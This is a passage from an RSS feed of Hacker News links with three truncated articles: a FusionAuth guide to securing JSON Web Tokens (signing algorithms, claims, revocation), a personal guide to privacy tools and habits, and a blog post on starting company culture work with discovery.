January 15, 2021 | https://fusionauth.io/learn/expert-advice/tokens/building-a-secure-jwt/ | <a href="https://web.archive.org/web/*/https://fusionauth.io/learn/expert-advice/tokens/building-a-secure-jwt/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
            
              <p>JSON Web Tokens (JWTs) get a lot of hate online for being insecure. Tom Ptacek, founder of <a href="https://latacora.com/">Latacora</a>, a security consultancy, had this to say about <a href="https://news.ycombinator.com/item?id=14292223">JWTs in 2017</a>:</p>

<blockquote>
  <p>So, as someone who does some work in crypto engineering, arguments about JWT being problematic only if implementations are “bungled” or developers are “incompetent” are sort of an obvious “tell” that the people behind those arguments aren’t really crypto people. In crypto, this debate is over.</p>

  <p>I know a lot of crypto people who do not like JWT. I don’t know one who does.</p>
</blockquote>

<p>Despite some negative sentiment, JWTs are a powerful and secure method of managing identity and authorization – they simply need to be used properly. They have other benefits too, they’re flexible, <a href="https://tools.ietf.org/html/rfc7519">standardized</a>, stateless, portable, easy to understand, and extendable. They also have libraries to help you generate and consume them in almost every programming language.</p>

<p>This article will help make sure your JWTs are unassailable. It’ll cover how you can securely integrate tokens into your systems by illustrating the most secure options.</p>

<p>However, every situation is different. You know your data and risk factors, so please learn these best practices and then apply them using judgement. A bank shouldn’t follow the same security practices as a ‘todo’ SaaS application; take your needs into account when implementing these recommendations.</p>

<p>One additional note regarding the security of JWTs is that they are similar in many respects to other signed data, such as SAML assertions. While JWTs are often stored in a wider range of locations than SAML tokens are, it is always recommended that you carefully protect any signed tokens.</p>

<h2 id="definitions">Definitions</h2>

<ul>
  <li><strong>creator</strong>: the system which creates the JWTs. In the world of OAuth this is often called an Authorization Server or AS.</li>
  <li><strong>consumer</strong>: a system which consumes a JWT. In the world of OAuth this is often called the Resource Server or RS. These consume a JWT to determine if they should allow access to a Protected Resource such as an API.</li>
  <li><strong>client</strong>: a system which retrieves a token from the creator, holds it, and presents it to other systems like a consumer.</li>
  <li><strong>claim</strong>: a piece of information asserted about the subject of the JWT. Some are standardized, others are application specific.</li>
</ul>

<h2 id="out-of-scope">Out of scope</h2>

<p>This article will only be discussing signed JWTs. Signing of JSON data structures is <a href="https://tools.ietf.org/html/rfc7515">standardized</a>. There are also standards for <a href="https://tools.ietf.org/html/rfc7516">encrypting JSON data</a> but signed tokens are more common, so we’ll focus on them. Therefore, in this article the term JWT refers to signed tokens, not encrypted ones.</p>

<h2 id="security-considerations">Security considerations</h2>

<p>When you are working with JWTs in any capacity, be aware of the footguns that are available to you (to, you know, let you shoot yourself in the foot).</p>

<p>The first is that a signed JWT is like a postcard. Anyone who has access to it can read it. Though this may look illegible, it’s trivial to decode:</p>

<div><div><pre><code>eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpc3MiOiJmdXNpb25hdXRoLmlvIiwiZXhwIjoxNTkwNzA4Mzg1LCJhdWQiOiIyMzhkNDc5My03MGRlLTQxODMtOTcwNy00OGVkOGVjZDE5ZDkiLCJzdWIiOiIxOTAxNmI3My0zZmZhLTRiMjYtODBkOC1hYTkyODc3Mzg2NzciLCJuYW1lIjoiRGFuIE1vb3JlIiwicm9sZXMiOlsiUkVUUklFVkVfVE9ET1MiXX0.8QfosnY2ZledxWajJJqFPdEvrtQtP_Y3g5Kqk8bvHjo
</code></pre></div></div>

<p>You can decode it using <a href="https://fusionauth.io/learn/expert-advice/dev-tools/jwt-debugger">any number of online tools</a>, because it’s just three base 64 encoded strings joined by periods.</p>

<p>Keep any data that you wouldn’t want in the hands of someone else outside of your JWT. When you sign and send a token, or when you decode and receive it, you’re guaranteed the contents didn’t change. You’re not guaranteed the contents are unseen.</p>

<p>A corollary of that is that any information you do send should avoid unintentional data leakage. This would include information such as identifiers. If a JWT includes a value like <code>123</code> for an id, that means anyone viewing it has a pretty good idea that there is an entity with the id of <code>122</code>. Use a GUID or random string for identifiers instead. Likewise, because tokens are not encrypted, use TLS for transmitting them.</p>

<p>Don’t send JWTs using an HTTP method that may be cached or logged. So don’t append the token to a <code>GET</code> request as a parameter. If you must send it in a GET request, use an HTTP header. You can also use other HTTP methods such as <code>POST</code>, which sends the JWT as a part of a request body. Sending the token value as part of a <code>GET</code> URL might result in the JWT being stored in a proxy’s memory or filesystem, a browser cache, or even in web server access logs.</p>

<p>If you are using OAuth, be careful with the Implicit grant, because if not implemented correctly, it can send the JWT (the access token) as a request parameter or fragment. For example, the <a href="https://developers.docusign.com/esign-rest-api/guides/authentication/oauth2-implicit#step-1-obtain-the-access-token">Docusign esign REST API</a> delivers the access token as a URL fragment. Oops.</p>

<h2 id="creating-tokens">Creating tokens</h2>

<p>When you are creating a JWT, use a library. Don’t implement this RFC yourself. There are lots of <a href="https://openid.net/developers/jwt/">great libraries out there</a>. Use one.</p>

<p>Set the <code>typ</code> claim of your JWT header to a known value. This prevents one kind of token from being confused with one of a different type.</p>

<h3 id="signature-algorithms">Signature algorithms</h3>

<p>Choose the correct signing algorithm. You have two families of options, a symmetric algorithm like HMAC or an asymmetric choice like RSA or elliptic curve (ECC). The <code>"none"</code> algorithm, which doesn’t sign the JWT and allows anyone to generate a token with any payload they want, should not be used and any JWTs that use this signing algorithm (meaning they aren’t signed) should be rejected immediately.</p>

<p>There are two main factors in algorithm selection. The first is performance. A symmetric signing algorithm like HMAC is simply faster. Here are the benchmark results using the <code>ruby-jwt</code> library, which encoded and decoded a token 50,000 times:</p>

<div><div><pre><code>hmac encode
  4.620000   0.008000   4.628000 (  4.653274)
hmac decode
  6.100000   0.032000   6.132000 (  6.152018)
rsa encode
 42.052000   0.048000  42.100000 ( 42.216739)
rsa decode
  6.644000   0.012000   6.656000 (  6.665588)
ecc encode
 11.444000   0.004000  11.448000 ( 11.464170)
ecc decode
 12.728000   0.008000  12.736000 ( 12.751313)
</code></pre></div></div>

<p>Don’t look at the absolute numbers, they’re going to change based on the programming language, what’s happening on the system during a benchmark run, and CPU horsepower. Instead, focus on the ratios. RSA encoding took approximately 9 times as long as HMAC encoding. ECC took almost two and a half times as long to encode and twice as long to decode. The code is <a href="https://github.com/FusionAuth/fusionauth-example-ruby-jwt/blob/master/benchmark_algos.rb">available</a> if you’d like to take a look. Symmetric signatures are faster than asymmetric options.</p>

<p>However, the shared secret required for options like HMAC has security implications. The token consumer can create a JWT indistinguishable from a token built by the creator, because both have access to the algorithm and the shared secret.</p>

<p>The second factor in choosing the correct signing algorithm is secret distribution. HMAC requires a shared secret to decode and encode the token. This means you need some method to provide the secret to both the creator and consumer of the JWT. If you control both parties and they live in a common environment, this is not typically a problem; you can add the secret to whatever secrets management solution you use and have both entities pull the secret from there. However, if you want outside entities to be able to verify your tokens, choose an asymmetric option. This might happen if the consumer is operated by a different department or business. The token creator can use the <a href="https://tools.ietf.org/html/rfc7517">JWK</a> specification to publish public keys, and then the consumer of the JWT can validate it using that key.</p>

<p>By using public/private key cryptography to sign the tokens, the issue of a shared secret is bypassed. Because of this, using an asymmetric option allows a creator to provide JWTs to token consumers that are not trusted. No system lacking the private key can generate a valid token.</p>

<p>If you have a choice between RSA and elliptic curve cryptography for a public/private key signing algorithm, choose elliptic curve cryptography, as it’s easier to configure correctly, more modern, has fewer attacks, and is faster. You might have to use RSA if other parties don’t support ECC.</p>

<h3 id="claims">Claims</h3>

<p>Make sure you set your claims appropriately. The JWT specification is clear:</p>

<blockquote>
  <p>The set of claims that a JWT must contain to be considered valid is context dependent and is outside the scope of this specification.</p>
</blockquote>

<p>Therefore no claims are required by the RFC. But to maximize security, the following registered claims should be part of your token creation:</p>

<ul>
  <li><code>iss</code> identifies the issuer of the JWT. It doesn’t matter exactly what this string is as long as it is unique, doesn’t leak information about the internals of the issuer, and is known by the consumer.</li>
  <li><code>aud</code> identifies the audience of the token. This can be a scalar or an array value, but in either case it should also be known by the consumer.</li>
  <li><code>nbf</code> and <code>exp</code> claims determine the timeframe that the token is valid. The <code>nbf</code> claim can be useful if you are issuing a token for future use. The <code>exp</code> claim, a time beyond which the JWT is no longer valid, should always be set.</li>
</ul>

<h3 id="revocation">Revocation</h3>

<p>Because it is difficult to invalidate JWTs once issued–one of their benefits is that they are stateless, which means that their holders don’t need to reach out to any server to verify they are valid–you should keep their lifetime on the order of hours or minutes, rather than days or months. Short lifetimes mean that should a JWT be stolen, the stolen token will soon expire and no longer be accepted by the consumer.</p>

<p>But there are times, such as a data breach or a user logging out of your application, when you’ll want to revoke tokens, either across a system or on a more granular level. You have a few choices here. These are in order of how much effort implementation would require from the token consumer:</p>

<ul>
  <li>Let tokens expire. No effort required here.</li>
  <li>Have the creator rotate the secret or private key. This invalidates all extant tokens.</li>
  <li>Use a ‘time window’ solution in combination with webhooks. Read more about this …</li></ul></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://fusionauth.io/learn/expert-advice/tokens/building-a-secure-jwt/">https://fusionauth.io/learn/expert-advice/tokens/building-a-secure-jwt/</a></em></p>]]>
            </description>
            <link>https://fusionauth.io/learn/expert-advice/tokens/building-a-secure-jwt/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25791280</guid>
            <pubDate>Fri, 15 Jan 2021 14:27:59 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Close the curtains: A practical guide to privacy]]>
            </title>
            <description>
<![CDATA[
Score 8 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25791214">thread link</a>) | @yashmehrotra
<br/>
January 15, 2021 | https://yashmehrotra.com/post/2021-01-15-practical-guide-to-privacy/ | <a href="https://web.archive.org/web/*/https://yashmehrotra.com/post/2021-01-15-practical-guide-to-privacy/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
        
  <section class="page">
  <article>
    <header>
      
    </header>

    <h2 id="the-need-for-privacy">The need for privacy</h2>
<blockquote>
<p>Why should I care about privacy, I have nothing to hide</p>
</blockquote>
<p>Until a few years back, this question was very difficult to answer. People always perceived privacy in the physical sense. No one grasped the concept of digital privacy, let alone care about it.</p>
<p>You wouldn’t want a stranger to enter your home uninvited, right? So why treat your digital world any different. Your digital world contains private information like conversations, interactions, interests, and transactions that are worth protecting.</p>
<p><img src="https://yashmehrotra.com/images/privacy-snowden-quote.png" alt="Snowden Quote"></p>
<p>With invasive ads and all websites you visit keeping a track of you, I would say a breaking point will be reached soon. In action, it would be defined as when someone would go the inconvenient way of achieving a task to preserve their privacy.</p>
<p>The harsh truth is, <a href="https://en.wikipedia.org/wiki/Surveillance_capitalism">surveillance capitalism</a> is <a href="https://thereader.mitpress.mit.edu/tech-companies-are-profiling-us-from-before-birth/">real</a>, and it is <a href="https://qz.com/1950685/instagrams-shop-tab-shows-the-dangers-surveillance-capitalism/">rising</a>. With FAAG (Facebook, Apple, Amazon &amp; Google) either buying every company or eliminating them by copying their feature’s which remotely threaten them, they are centralizing all your data. Google recently acquired FitBit (a fitness tracker manufacturing company) only to have an <a href="https://www.theverge.com/2020/8/4/21353947/google-fitbit-acquisition-eu-investigation-antitrust-health-tracking-data">anti-trust investigation launched</a> against them with fears over Google misusing health data.</p>
<p>Fortunately, as times changed, people’s mindsets changed as well. They started realizing that the lives they live digitally have significance too. And those who still weren’t quite convinced, Facebook and Google ironically played a major role in persuading them their privacy is actually at stake by crossing the line far too many times.<img src="https://yashmehrotra.com/images/privacy-news-articles.png" alt="They just don’t care"></p>
<p>The question which arises is what can we do? Are we becoming too set in our ways or can we take back what should have always belonged to us,  our privacy.</p>
<h2 id="why-an-eventual-compromise-is-the-answer">Why an eventual compromise is the answer</h2>
<p>Going off the grid is impractical. Migrating away from an entire ecosystem is strenuous. The FAAG are here to stay.</p>
<p>An eventual compromise here means restricting yourself to use only a few services provided by those companies but only limited to that. A trade-off essentially and making your peace with it.</p>
<p>The bitter reality is that distancing yourself from these services comes at a greater cost of convenience. While there are some extremists who have taken those difficult steps, they also have to convince their friends and family as well to make the switch.</p>
<p>As much as you may disgust Facebook, you might still have to use WhatsApp because everyone else already does, it is more of a necessity now. Albeit, Signal is gaining some much deserved popularity recently, it is still miles away from WhatsApp’s market cap.</p>
<p>Ever thought of removing Google entirely from your life? It is nerve-racking.</p>
<p>This is where trade-offs and calculated risks come into place. Rather than going cold turkey on the services deeply rooted in our lives, we choose to be aware of what information do they have about us and the risks that they pose. We take a conscious call knowing how much and what kind of data are we sharing and what we are getting in exchange.</p>
<h2 id="evaluation-criteria">Evaluation criteria</h2>
<p>Everyone has a different framework when it comes to choosing the tool to use.</p>
<p>Some people value ease of use whilst others may value integrations with different software.</p>
<p>Some would value privacy over functionality, others may not.</p>
<p>Some prefer to go for self-hosted tools whereas a huge part of the population don’t even know what that means.</p>
<p>This depends on person to person and use case to use case, think one of your own.</p>
<p>While deciding, also keep in mind the privacy laws of your country (esp. Key disclosure law) and whether the service you are using is part of <a href="https://restoreprivacy.com/5-eyes-9-eyes-14-eyes/">5-9-14 eyes</a>. If you think this is too extreme, you can just skim through the Privacy Policy and see whether you are comfortable with the data they are capturing and sharing with their third-party services.</p>
<p>The <a href="https://www.privacytools.io/">privacytools.io</a> website could be your guide for this process.</p>

<p><strong>Browser: Firefox</strong></p>
<p>I use Firefox because of its simplicity, care for user’s privacy, and <a href="https://www.mozilla.org/en-US/about/manifesto/">Mozilla’s commitment to keeping the web an open platform</a>. Feature-wise, Firefox is at par with other browsers and I have found it to be less RAM hungry than Chrome.</p>
<p>Extensions:</p>
<ul>
<li><a href="https://addons.mozilla.org/en-US/firefox/addon/multi-account-containers/">Multi-account containers: </a> It lets you keep parts of your online life separated into color-coded tabs that preserve your privacy. For eg. I have containers for Personal, Work, Google, Banking, Shopping, etc. This ensures that cookies aren’t shared between those containers and is essentially equivalent to using a different browser. My goal for this year is to not see a single relevant advertisement.</li>
<li><a href="https://addons.mozilla.org/en-US/firefox/addon/ublock-origin/">uBlock Origin</a>: Block all the unwanted trackers (You can also install this on your mobile phone).</li>
<li>You can also go through this <a href="https://blog.mozilla.org/firefox/make-your-firefox-browser-a-privacy-superpower-with-these-extensions/">list of privacy enhancing extensions curated by Mozilla</a>.</li>
</ul>
<p><strong>Storage</strong></p>
<p>Since the dawn of the digital age, we have accumulated massive amount of data over the years. After all, we use multiple devices each of which have their own storage. But keep in mind that these are our private files and should be kept with a company that respects our privacy.</p>
<ul>
<li>I personally use pCloud. It is the least of all the evils (although they charge extra for zero knowledge encrypted storage).</li>
<li><a href="https://protonmail.com/blog/proton-drive-early-access/">ProtonDrive</a> is also releasing soon which seems promising.</li>
<li>If you want to self-host, Nextcloud and Syncthing are good.</li>
<li>Just do not go for Google Drive, iCloud or OneDrive.</li>
<li>Follow the 3-2-1 backup rule: At least 3 copies of your data in 2 different locations, 1 of which needs to be off-site.</li>
</ul>
<p><strong>Email</strong></p>
<ul>
<li>Slowly moving to <a href="https://protonmail.com/">ProtonMail</a> for primary mail. Privacy is their unique selling point.</li>
<li>Gmail due to legacy reasons. A lot of critical accounts and contacts still have that email.</li>
</ul>
<p><strong>Communication</strong></p>
<ul>
<li>Use Signal</li>
<li>Avoid WhatsApp, Facebook will eventually get rid of the end-to-end encryption.</li>
<li>Story Time: After selling Whatsapp to Facebook, the founder Brian Acton was assured that end-to-end encryption won’t be removed and they’ll figure other ways to monetize it. Though Facebook failed to keep their end of the deal, which ended up with Brian Acton donating $50 million USD to Open Whisper Foundation (Signal’s Parent organization).</li>
</ul>
<p><strong>Password management</strong></p>
<ul>
<li>Use a password manager. Period.</li>
<li>Use different passwords for different websites so that in case one company’s database gets breached, you wouldn’t have to worry about other websites (All the password managers have password generation functionality).</li>
<li>I personally advocate for <a href="https://bitwarden.com/">Bitwarden</a>, but <a href="https://www.lastpass.com/">Lastpass</a> and <a href="https://1password.com/">1password</a> are good too.</li>
<li>Keep in mind that your password manager will be your single point of failure so you need to make sure that the masters password is extremely strong.</li>
</ul>
<p><strong>VPN</strong></p>
<ul>
<li>Not easy to choose, they all have pro’s and con’s. Use <a href="https://privacytools.io/providers/vpn/">privacytools’s VPN page</a> to choose and also take a look at country of origin and their logging policy.</li>
<li>Tor Browser is the best for anonymous browsing but some of the websites you use may break over there.</li>
</ul>
<p><strong>Search Engine</strong></p>
<ul>
<li>I know, I know, the others are not as good as Google. But they are not all that bad. I’ve been using <a href="https://duckduckgo.com/">DuckDuckGo</a> for quite sometime and it works 95% of the time, and is improving constantly.</li>
<li>The problem with Google is not only does it scan and analyze all your searches, it has its <a href="https://www.rt.com/usa/503964-whistleblower-google-skews-results/">own biases</a> and is known for <a href="https://www.theregister.com/2020/10/21/google_search_iframe/">skewing the results</a> as <a href="https://www.ccn.com/google-manipulates-search-results-former-engineer-shockingly-confirms/">they see fit</a>.</li>
</ul>
<h2 id="behavioral-changes-you-can-make">Behavioral changes you can make</h2>
<p>When it comes to a certain behavior, our brains are hard-wired to do things subconsciously that we ourselves may not be aware of. Companies research and study this behavior, and do their best to exploit this.</p>
<p>Here are a few common things that you can start with:</p>
<ul>
<li>
<p>No need to tell EVERYONE your email</p>
<ul>
<li>Use a temporary email if you just want to check out a site that requires account creation. Services like <a href="https://temp-mail.org/">TempMail</a> can be used to get temporary emails.</li>
<li>It will help you reduce the unwanted amount of spam.</li>
</ul>
</li>
<li>
<p>Don’t share unnecessary details</p>
<ul>
<li>If a site asks for your birthday or gender, don’t give it.</li>
<li>Don’t fill out all the details of the profile page unless the functioning of the website is being effected.</li>
<li>James Jani, a YouTuber <a href="https://www.youtube.com/watch?v=uZ2l-kk5ihk">explains how this data eventually ends up being sold to the highest bidder</a>.</li>
</ul>
</li>
<li>
<p>Use incognito mode if you are just browsing and don’t want a persistent session</p>
<ul>
<li>This applies to all searches and website visits. The rule of thumb I follow is: If you have to login, use a normal window, else go incognito.</li>
<li>Incognito mode does not hide your browsing from service providers, but it makes it harder for ad networks to track you across different websites.</li>
</ul>
</li>
<li>
<p>The whole world is watching philosophy</p>
<ul>
<li>For social media sites like Instagram/Twitter/Facebook: Assume everything you post is public. It would not just be viewed by your friends or followers, everyone can see what you post.</li>
<li>This comes under the “Eventual compromise” we discussed earlier, we are aware of the negative consequences but we take a call because <del>we want to be up to date with the memes</del> these websites can have a positive effect if we use them the right way.</li>
</ul>
</li>
<li>
<p>Avoid “smart” devices</p>
<ul>
<li>Both Amazon and Google’s home devices have been caught listening to user’s when they weren’t supposed to.</li>
<li><a href="https://www.theguardian.com/technology/2019/oct/09/alexa-are-you-invading-my-privacy-the-dark-side-of-our-voice-assistants">Amazon’s echo apparently sent their owner’s recordings to someone else without their permission or knowledge</a> and <a href="https://www.cnbc.com/2019/07/11/google-admits-leaked-private-voice-conversations.html">Google just doesn’t care enough once they acquire the data</a>.</li>
</ul>
</li>
<li>
<p>Review your phone’s app permissions</p>
<ul>
<li>Mobile apps would try their hardest to get as many data points as they can which often includes sending &amp; connecting to trackers automatically in the background.</li>
<li>Be aware of which apps have critical permissions like location, microphone &amp; camera.</li>
<li>Android and iOS did introduce the “Allow permission just for now” functionality to curb this.</li>
</ul>
</li>
</ul>
<blockquote>
<p>If you are not paying for the product, then the gradual changes in your behavior &amp; perception is the product</p>
<p>– Jaron Lanier (The Social Dilemma)</p>
</blockquote>

<ul>
<li>It may be hard to, but get off Facebook. It went from being a good social media platform to catch-up with your peers but now it has turned into a tool used to “program people’s thoughts”. <a href="https://www.youtube.com/watch?v=MakEIlvlyfE">Here is a former Facebook exec talking about how it is tearing apart the fabric of society</a>.</li>
<li>Luckily for me, most of my close circle slowly …</li></ul></article></section></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://yashmehrotra.com/post/2021-01-15-practical-guide-to-privacy/">https://yashmehrotra.com/post/2021-01-15-practical-guide-to-privacy/</a></em></p>]]>
            </description>
            <link>https://yashmehrotra.com/post/2021-01-15-practical-guide-to-privacy/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25791214</guid>
            <pubDate>Fri, 15 Jan 2021 14:21:14 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Why most 'culture work' hurts your company]]>
            </title>
            <description>
<![CDATA[
Score 5 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25791209">thread link</a>) | @lzybes
<br/>
January 15, 2021 | https://www.purpose.jobs/blog/why-most-culture-work-actually-hurts-your-company | <a href="https://web.archive.org/web/*/https://www.purpose.jobs/blog/why-most-culture-work-actually-hurts-your-company">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
<p><span id="hs_cos_wrapper_post_body" data-hs-cos-general-type="meta_field" data-hs-cos-type="rich_text"><p><em>And the simple way to ensure your culture eats strategy for lunch.</em></p>
<!--more-->
<p>A quick story to set the stage: About six years ago I scaled my company from 15-employees to 75-employees in about nine months, which was one of the most painful experiences of my business life. Our corporate culture, previously a strong suit of the business, was completely unprepared for the stresses of that type of rapid scale-up, and the growth almost killed my company.</p>
<p>Then we did the incredibly challenging work of transforming our culture from the inside out, while still hitting milestones of a venture-backed, high-growth company. With the support of a ton of dedicated people, we did it, and the company is now back on track to (fingers crossed) win the market.</p>
<p>All this to say that, having nearly ruined my company due to underinvesting in culture at a critical time, and having done the hard work of fixing and rebuilding our culture to become a strength once again, I have a unique appreciation for the importance, and delicacy, of corporate culture.</p>
<div><p>Here's the first thing I discuss with entrepreneurs as they start to work consciously on their culture:</p></div>
<h3>Why most “culture work” actually hurts your company, and what to do about it</h3>
<blockquote>
<p>“Culture eats strategy for lunch” — Peter Drucker</p>
</blockquote>
<p>This is one of the most popular quotes on corporate culture. And it’s true. The best company cultures are the foundation on which successful strategy after successful strategy are built.</p>
<p>So everyone should hire people to focus on culture, point them in the right direction, and get out of their way. Right?</p>
<p>Wrong.</p>
<p>According to Fred Kofman, author of Conscious Business and culture consultant to hundreds of organizations, the vast majority of culture work does more harm than good. As in, not only doesn’t it improve the culture, most culture work actually harms the culture it’s trying to help. America spends billions on corporate culture each year, and the sad reality is that, on average, companies would be better off simply crossing their fingers.</p>
<p>But why? Why does most of the effort put toward the most powerful lever in business backfire? Perhaps even more importantly, how can you ensure that the work you put into building your culture intentionally is among the small percentage that eats strategy for lunch?</p>
<p><a href="https://www.purpose.jobs/blog/culture-contribution-no-longer-say-culture-fit" rel="noopener" target="_blank"><img src="https://www.purpose.jobs/hs-fs/hubfs/Related%20blog%20articles%20(1).png?width=1600&amp;name=Related%20blog%20articles%20(1).png" alt="Related blog articles (1)" width="1600" srcset="https://www.purpose.jobs/hs-fs/hubfs/Related%20blog%20articles%20(1).png?width=800&amp;name=Related%20blog%20articles%20(1).png 800w, https://www.purpose.jobs/hs-fs/hubfs/Related%20blog%20articles%20(1).png?width=1600&amp;name=Related%20blog%20articles%20(1).png 1600w, https://www.purpose.jobs/hs-fs/hubfs/Related%20blog%20articles%20(1).png?width=2400&amp;name=Related%20blog%20articles%20(1).png 2400w, https://www.purpose.jobs/hs-fs/hubfs/Related%20blog%20articles%20(1).png?width=3200&amp;name=Related%20blog%20articles%20(1).png 3200w, https://www.purpose.jobs/hs-fs/hubfs/Related%20blog%20articles%20(1).png?width=4000&amp;name=Related%20blog%20articles%20(1).png 4000w, https://www.purpose.jobs/hs-fs/hubfs/Related%20blog%20articles%20(1).png?width=4800&amp;name=Related%20blog%20articles%20(1).png 4800w" sizes="(max-width: 1600px) 100vw, 1600px"></a></p>
<p><strong>Start with discovery, not Generation</strong></p>
<p>Ask ten CEOs what makes a good company culture, and they’ll all say something similar: Trust, freedom, autonomy, mastery, purpose, ping pong tables... For many leaders, when they set to work thinking about company culture their first instinct is to simply brainstorm (generate) the culture they want, usually some version of the above, and then figure out the quickest way to communicate those values to their team.</p>
<p><strong>This is the single most common way to disillusion your team and hurt your culture with the best of intentions. Because culture work must start with discovery, not generation.</strong></p>
<blockquote>
<p>There’s no way to open the future without closing the past. Unless the company’s leadership does a serious examination of their previous disengaging behaviors, and convinces the workforce that they are committed to change that behavior in a serious way, any engagement program is dead on arrival. — Fred Kofman</p>
</blockquote>
<p>The reality is that even if you’ve never thought about it, <span>your company already has a well-engrained culture with very specific characteristics, all of which your employees know well even if you do not (and if you think you do, but you haven’t asked employees to confirm, don’t be so sure)</span>. As a result, any values or mission you put on the wall, if they don’t match the actual, existing culture already present, they will communicate to your team you are clueless and, slowly or quickly, they’ll begin to check out. It’s as if your parents, after consistently missing your soccer games for partner calls,&nbsp;call a family meeting to say their core family value is “togetherness.”</p>
<p>Effective culture change work, the kind that changes an entire company rather than simply making an executive team feel progressive, begins with a deep discovery process. It asks the question: <strong>what is our existing culture now? What are our current values, whether or not we actually took the time to create them intentionally?</strong></p>
<p>Your parents first have to admit to their demonstrated value of “work&gt;family” and convince you they’re going to change, before you’ll hear the word “togetherness” without dripping cynicism. Similarly, <strong>you have to first discover, cop to, and clean up any messes resulting from your existing culture before you have the ability to change it.</strong></p>
<p><strong><img src="https://www.purpose.jobs/hs-fs/hubfs/startups%20people%20working.png?width=1389&amp;name=startups%20people%20working.png" alt="startups people working" width="1389" srcset="https://www.purpose.jobs/hs-fs/hubfs/startups%20people%20working.png?width=695&amp;name=startups%20people%20working.png 695w, https://www.purpose.jobs/hs-fs/hubfs/startups%20people%20working.png?width=1389&amp;name=startups%20people%20working.png 1389w, https://www.purpose.jobs/hs-fs/hubfs/startups%20people%20working.png?width=2084&amp;name=startups%20people%20working.png 2084w, https://www.purpose.jobs/hs-fs/hubfs/startups%20people%20working.png?width=2778&amp;name=startups%20people%20working.png 2778w, https://www.purpose.jobs/hs-fs/hubfs/startups%20people%20working.png?width=3473&amp;name=startups%20people%20working.png 3473w, https://www.purpose.jobs/hs-fs/hubfs/startups%20people%20working.png?width=4167&amp;name=startups%20people%20working.png 4167w" sizes="(max-width: 1389px) 100vw, 1389px"><br></strong></p>

<h3><strong>So how do we do this? Where do we look?</strong></h3>
<p>I know of two places to look. One is hard for one reason, and one is hard for another.</p>
<h3>1. Look inside your company</h3>
<p>Anonymous surveys are a great tool to understand how your culture is viewed by your employees. Anonymity is key, lest you get a bunch of sunshine blown up your butt. We built our own survey based on specific questions we had at my previous company, but a<span>&nbsp;</span><a href="https://www.google.com/search?q=culture+surveys&amp;rlz=1C5CHFA_enUS840US840&amp;oq=culture+surveys&amp;aqs=chrome..69i57j0j0i22i30j0i22i30i395l7.2476j1j4&amp;sourceid=chrome&amp;ie=UTF-8" rel="noopener" target="_blank">quick google search</a><span>&nbsp;</span>will give you many more options to choose from.</p>
<p>There is risk to this approach, however. A survey like this communicates to your employees that you understand the importance of culture, and that you will presumably listen to what they say and attempt to address it. If you take this route and do nothing to address the feedback afterward, it can cause the kind of harm we discussed above. This is a genie that is difficult to put back into the bottle.</p>
<br>
<h3>2. Look inside yourself</h3>
<p>At some point in every entrepreneur’s journey they realize that their company is simply a manifestation of their personality. The good and the bad. No matter what’s on the walls, the behavior of the leader dictates the culture. This presents a shortcut, in that you can understand your corporate culture by understanding yourself.</p>
<p>Are you late to meetings? That’s your culture. Others are late, too. Do you hold yourself to the grindstone, sacrificing holidays to make more progress? That’s your culture. Others do that, too. Do you pass the buck and blame others when things go wrong? You get the picture.</p>
<p>While most entrepreneurs resist the hell out of this (it’s scary considering your foundational role in creating the problem you see in everyone else), in my experience looking internally is the most reliable route to determine your culture. For those brave few, it’s best done with either a 360-degree survey, allowing you to get feedback from all your colleagues, or a dedicated coach to help you see your blindspots.</p>
<p><a href="https://www.purpose.jobs/blog/the-dark-side-of-crushing-it" rel="noopener" target="_blank"><img src="https://www.purpose.jobs/hs-fs/hubfs/More%20from%20Ryan%20Vaughn%20(1).png?width=1600&amp;name=More%20from%20Ryan%20Vaughn%20(1).png" alt="More from Ryan Vaughn (1)" width="1600" srcset="https://www.purpose.jobs/hs-fs/hubfs/More%20from%20Ryan%20Vaughn%20(1).png?width=800&amp;name=More%20from%20Ryan%20Vaughn%20(1).png 800w, https://www.purpose.jobs/hs-fs/hubfs/More%20from%20Ryan%20Vaughn%20(1).png?width=1600&amp;name=More%20from%20Ryan%20Vaughn%20(1).png 1600w, https://www.purpose.jobs/hs-fs/hubfs/More%20from%20Ryan%20Vaughn%20(1).png?width=2400&amp;name=More%20from%20Ryan%20Vaughn%20(1).png 2400w, https://www.purpose.jobs/hs-fs/hubfs/More%20from%20Ryan%20Vaughn%20(1).png?width=3200&amp;name=More%20from%20Ryan%20Vaughn%20(1).png 3200w, https://www.purpose.jobs/hs-fs/hubfs/More%20from%20Ryan%20Vaughn%20(1).png?width=4000&amp;name=More%20from%20Ryan%20Vaughn%20(1).png 4000w, https://www.purpose.jobs/hs-fs/hubfs/More%20from%20Ryan%20Vaughn%20(1).png?width=4800&amp;name=More%20from%20Ryan%20Vaughn%20(1).png 4800w" sizes="(max-width: 1600px) 100vw, 1600px"></a></p>

<p><strong>I’ve reconciled with my current culture. Now what?</strong></p>
<p>No matter which discovery route you take, how you get to an understanding of your current state of affairs, the process of changing a corporate culture without hurting the business is always the same:</p>
<blockquote>
<p><strong>Step 1:</strong> Change yourself such that you live the values by which you want the company to live.</p>
<p><strong>Step 2:</strong> Write the values by which you live on the wall.</p>
</blockquote>
<p>And if you’re wondering, yes that’s what we did to transform our culture at speed.</p>
<p>1. We looked in the mirror as a leadership team (me especially)</p>
<p>2. We talked openly about the pimples we saw there</p>
<p>3. We made commitments to act differently</p>
<p>4. We acted differently</p>
<p>5. Our culture changed</p>

<p>Nobody said it was easy.</p>

<h3>About <a href="https://www.purpose.jobs/blog/author/ryan-vaughn" rel="noopener" target="_blank">Ryan Vaughn</a>:</h3>
